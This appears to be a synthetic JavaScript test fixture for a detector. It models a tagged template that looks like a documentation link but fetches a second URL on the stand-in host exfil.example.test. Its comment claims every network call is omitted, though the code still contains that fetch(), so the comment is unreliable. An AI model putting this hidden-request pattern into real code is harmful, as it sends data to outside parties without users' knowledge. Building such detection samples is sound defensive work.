// DEFANGED RECONSTRUCTION for ADR-024, modeled on the template element boundary evasion.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a tag function that fetches the element after the expression while the
// first element holds a URL inside prose.
// Omitted: every network call; the host is a reserved .example.test name.
const tag = (p) => fetch(p[1]);
module.exports = () =>
  tag`See https://docs.example.test/${0}https://exfil.example.test/c`;
